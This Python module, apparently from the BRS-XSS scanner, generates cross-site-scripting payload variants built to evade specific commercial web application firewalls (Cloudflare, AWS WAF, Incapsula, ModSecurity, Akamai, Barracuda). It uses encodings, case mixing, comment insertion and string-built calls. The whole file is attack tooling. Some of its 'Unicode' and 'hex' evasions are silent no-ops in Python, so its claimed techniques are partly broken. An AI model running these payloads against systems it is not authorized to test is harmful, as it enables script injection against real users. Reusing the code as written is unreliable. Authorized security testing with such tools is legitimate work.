#!/usr/bin/env python3

"""
BRS-XSS WAF Evasions

WAF-specific evasion techniques for payload generation.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Sat 02 Aug 2025 11:25:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Any, Optional
from .payload_types import GeneratedPayload
from ..utils.logger import Logger

logger = Logger("core.waf_evasions")


class WAFEvasions:
    """WAF-specific evasion techniques"""
    
    def generate_waf_specific_payloads(
        self,
        base_payload: str,
        detected_wafs: List[Any]
    ) -> List[GeneratedPayload]:
        """
        Generate WAF-specific evasion payloads.
        
        Args:
            base_payload: Base payload to modify
            detected_wafs: List of detected WAFs
            
        Returns:
            List of WAF-specific payloads
        """
        evasion_payloads = []
        
        for waf in detected_wafs:
            waf_type = getattr(waf, 'waf_type', None)
            
            if not waf_type:
                continue
            
            waf_variants = []
            
            # Generate evasions based on WAF type
            waf_value = waf_type.value if hasattr(waf_type, 'value') else str(waf_type)
            
            if waf_value == 'cloudflare':
                waf_variants = self.cloudflare_evasions(base_payload)
            elif waf_value == 'aws_waf':
                waf_variants = self.aws_waf_evasions(base_payload)
            elif waf_value == 'incapsula':
                waf_variants = self.incapsula_evasions(base_payload)
            elif waf_value == 'modsecurity':
                waf_variants = self.modsecurity_evasions(base_payload)
            elif waf_value == 'akamai':
                waf_variants = self.akamai_evasions(base_payload)
            elif waf_value == 'barracuda':
                waf_variants = self.barracuda_evasions(base_payload)
            
            # Convert variants to GeneratedPayload objects
            for variant in waf_variants:
                evasion_payloads.append(GeneratedPayload(
                    payload=variant,
                    context_type='unknown',
                    evasion_techniques=[f'{waf_value}_specific'],
                    effectiveness_score=0.8,
                    description=f"{waf_value} specific evasion"
                ))
        
        logger.debug(f"Generated {len(evasion_payloads)} WAF-specific payloads")
        return evasion_payloads
    
    def cloudflare_evasions(self, payload: str) -> List[str]:
        """Cloudflare-specific evasions"""
        evasions = []
        
        # Bypass techniques specific to Cloudflare
        evasions.extend([
            payload.replace('<script>', '<script/x>'),
            payload.replace('<script>', '<script/**/>')
        ])
        
        # Unicode evasions
        if 'alert' in payload:
            evasions.append(payload.replace('alert', 'ale\u0072t'))
        
        # Tag closure manipulation
        if '>' in payload:
            evasions.append(payload.replace('>', '//>'))
        
        # Comment insertion
        if ' ' in payload:
            evasions.append(payload.replace(' ', '/**/'))
        
        # URL encoding of special chars
        evasions.append(
            payload.replace('(', '%28').replace(')', '%29')
        )
        
        # Mixed case with encoding
        mixed_case = payload.replace('script', 'ScRiPt')
        evasions.append(mixed_case.replace('=', '%3d'))
        
        return [e for e in evasions if e != payload]
    
    def aws_waf_evasions(self, payload: str) -> List[str]:
        """AWS WAF-specific evasions"""
        evasions = []
        
        # Hex encoding evasions
        evasions.extend([
            payload.replace('script', 'scr\x69pt'),
            payload.replace('=', '\x3d'),
            payload.replace('<', '\x3c'),
            payload.replace('>', '\x3e')
        ])
        
        # String construction evasions
        if 'alert' in payload:
            evasions.extend([
                payload.replace('alert', 'window["ale"+"rt"]'),
                payload.replace('alert', 'self["ale"+"rt"]'),
                payload.replace('alert', 'top["ale"+"rt"]')
            ])
        
        # Unicode normalization bypass
        evasions.append(payload.replace('script', 'sc\u0072ipt'))
        
        # Null byte insertion (where applicable)
        evasions.append(payload.replace('=', '=\x00'))
        
        return [e for e in evasions if e != payload]
    
    def incapsula_evasions(self, payload: str) -> List[str]:
        """Incapsula-specific evasions"""
        evasions = []
        
        # String concatenation
        if 'alert' in payload:
            evasions.extend([
                payload.replace('alert', 'window["ale"+"rt"]'),
                payload.replace('alert', 'eval("ale"+"rt")')
            ])
        
        # Charset attribute bypass
        if '<script>' in payload:
            evasions.append(payload.replace('<script>', '<script charset="utf-8">'))
        
        # Unicode in event handlers
        if 'onload' in payload:
            evasions.append(payload.replace('onload', 'on\u006coad'))
        
        # URL encoding
        evasions.append(
            payload.replace('(', '%28').replace(')', '%29')
        )
        
        # Case variation with Unicode
        evasions.append(
            payload.replace('onerror', 'onErr\u006fr')
        )
        
        return [e for e in evasions if e != payload]
    
    def modsecurity_evasions(self, payload: str) -> List[str]:
        """ModSecurity-specific evasions"""
        evasions = []
        
        # Whitespace manipulation
        evasions.extend([
            payload.replace(' ', '\t'),
            payload.replace(' ', '\n'),
            payload.replace(' ', '\r')
        ])
        
        # Case variations
        evasions.extend([
            payload.replace('script', 'ScRiPt'),
            payload.replace('alert', 'AlErT'),
            payload.replace('eval', 'EvAl')
        ])
        
        # Null byte insertion
        evasions.append(payload.replace('=', '=\x00'))
        
        # Mixed case pattern
        mixed_case = ''.join([
            c.upper() if i % 2 == 0 else c.lower() 
            for i, c in enumerate(payload)
        ])
        evasions.append(mixed_case)
        
        # Comment insertion
        evasions.append(payload.replace('script', 'scr/**/ipt'))
        
        return [e for e in evasions if e != payload]
    
    def akamai_evasions(self, payload: str) -> List[str]:
        """Akamai-specific evasions"""
        evasions = []
        
        # Double encoding
        evasions.append(
            payload.replace('<', '%253c').replace('>', '%253e')
        )
        
        # UTF-7 encoding (where applicable)
        if '<script>' in payload:
            evasions.append('+ADw-script+AD4-alert(1)+ADw-/script+AD4-')
        
        # Base64 in data URLs
        if 'javascript:' in payload:
            evasions.append(
                payload.replace('javascript:', 'data:text/html;base64,')
            )
        
        # Fragment identifier bypass
        evasions.append(payload + '#')
        
        return [e for e in evasions if e != payload]
    
    def barracuda_evasions(self, payload: str) -> List[str]:
        """Barracuda-specific evasions"""
        evasions = []
        
        # Tab character insertion
        evasions.append(payload.replace(' ', '\t'))
        
        # Form feed character
        evasions.append(payload.replace(' ', '\f'))
        
        # Vertical tab
        evasions.append(payload.replace(' ', '\v'))
        
        # Multiple encoding layers
        double_encoded = payload.replace('<', '%253c')
        evasions.append(double_encoded)
        
        # Case obfuscation
        if 'javascript:' in payload:
            evasions.append(payload.replace('javascript:', 'JaVaScRiPt:'))
        
        return [e for e in evasions if e != payload]